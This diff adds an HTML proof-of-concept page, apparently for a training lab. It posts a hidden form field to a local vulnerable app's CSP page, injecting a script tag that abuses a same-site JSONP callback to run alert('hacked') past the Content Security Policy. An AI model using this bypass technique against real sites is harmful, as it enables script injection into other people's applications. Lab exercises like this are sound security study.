@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CSP Bypass</title>
+        <meta charset="UTF-8">
+</head>
+<body>
+
+	<form action="http://172.17.0.2/vulnerabilities/csp/" method="post">
+		<input type="hidden" name="include" value="<script src=&quot;source/jsonp.php?callback=alert('hacked')&quot;</script>">
+		<input type="submit" value="Click Me!">
+	</form>
+
+</body>
+</html>
